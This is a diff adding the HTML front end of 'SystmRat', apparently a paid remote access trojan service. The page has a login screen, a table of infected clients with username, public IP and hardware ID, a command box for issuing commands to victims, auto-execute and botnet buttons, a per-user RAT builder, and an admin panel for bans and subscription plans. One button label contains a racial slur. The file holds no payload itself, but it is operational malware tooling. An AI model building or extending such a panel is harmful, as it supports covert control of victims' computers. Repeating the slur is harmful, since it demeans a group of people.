@@ -1,0 +1,80 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SystmRat Dashboard</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="login-panel" class="login-panel">
+        <video autoplay muted loop id="bg-video">
+            <source src="assets/bg/bg.mp4" type="video/mp4">
+        </video>
+        <div class="login-content">
+            <h1>SystmRat</h1>
+            <input type="text" id="login-username" placeholder="Username">
+            <input type="password" id="login-password" placeholder="Password">
+            <button onclick="login()">Login</button>
+            <button onclick="register()">Register</button>
+        </div>
+    </div>
+
+    <div id="dashboard" class="container" style="display: none;">
+        <div class="sidebar">
+            <div class="menu-item active">RAT Dashboard</div>
+            <div class="menu-item">Logs</div>
+            <div class="menu-item">Dashboard</div>
+            <div class="menu-item">Config</div>
+            <div class="menu-item">Discord</div>
+            <div class="menu-item">Builder</div>
+            <div class="menu-item">RATS</div>
+            <div class="menu-item red">Logout</div>
+        </div>
+
+        <div class="main">
+            <div class="button-row">
+                <button class="blue-button">Auto Execute</button>
+                <button class="blue-button">Auto Execute If Negro</button>
+                <button class="blue-button">BotNet</button>
+            </div>
+
+            <div class="client-list">
+                <div class="client-header">
+                    <span>Username</span>
+                    <span>Public IP</span>
+                    <span>HWID</span>
+                    <span>Status</span>
+                    <span>Action</span>
+                </div>
+                <div id="client-entries"></div>
+            </div>
+
+            <div class="chat-box">
+                <div id="chat-messages"></div>
+                <input type="text" id="chat-input" placeholder="Enter command...">
+                <button onclick="sendCommand()">Send</button>
+            </div>
+
+            <div id="admin-panel" style="display: none;">
+                <h3>Admin Panel</h3>
+                <select id="user-list"></select>
+                <button onclick="banUser()">Ban</button>
+                <button onclick="unbanUser()">Unban</button>
+                <input type="number" id="suspend-days" placeholder="Days">
+                <button onclick="suspendUser()">Suspend</button>
+                <input type="date" id="plan-expires">
+                <button onclick="setPlan()">Set Plan</button>
+            </div>
+
+            <div id="builder" style="display: none;">
+                <h3>Builder</h3>
+                <input type="text" id="build-user-id" placeholder="User ID">
+                <button onclick="buildRAT()">Build RAT</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
